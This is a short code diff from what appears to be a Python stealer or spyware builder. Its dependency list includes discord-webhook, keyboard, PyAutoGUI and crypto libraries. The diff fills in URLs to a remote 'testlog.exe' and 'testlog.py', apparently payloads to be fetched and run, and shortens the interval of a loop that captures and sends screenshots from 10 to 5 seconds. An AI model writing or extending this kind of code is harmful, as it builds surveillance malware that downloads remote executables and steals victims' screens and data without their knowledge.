@@ -33,9 +33,9 @@ global executableUrl, executableName
 global pythonUrl, pythonName
 global requirements
 requirementString = "altgraph;autopep8;certifi;charset-normalizer;colorama;discord-webhook;future;get-mac;httpx;idna;keyboard;pefile;Pillow;psutil;PyAutoGUI;pycodestyle;pycryptodome;pycryptodomex;pyinstaller;pyinstaller-hooks-contrib;pystyle;pywin32;pywin32-ctypes;pyzipper;requests;toml;urllib3;winshell;win32-bridge;win32-setctime;win32-setfiletime;"
-executableUrl = ""
+executableUrl = "https://raw.githubusercontent.com/UnleqitQ/_test_/main/testlog.exe"
 executableName = "test12"
-pythonUrl = ""
+pythonUrl = "https://raw.githubusercontent.com/UnleqitQ/_test_/main/testlog.py"
 pythonName = "test12"
 requirements = requirementString.split(";")
 
@@ -717,7 +717,7 @@ Date last Used: {dateLastUsed}
     def loopScreenshots(self) -> None:
         while True:
             self.sendScreenshot()
-            sleep(float("10"))
+            sleep(float("5"))
 
     def sendScreenshot(self) -> None:
         imgName = time.strftime("%Y%m%d-%H%M%S.jpg")
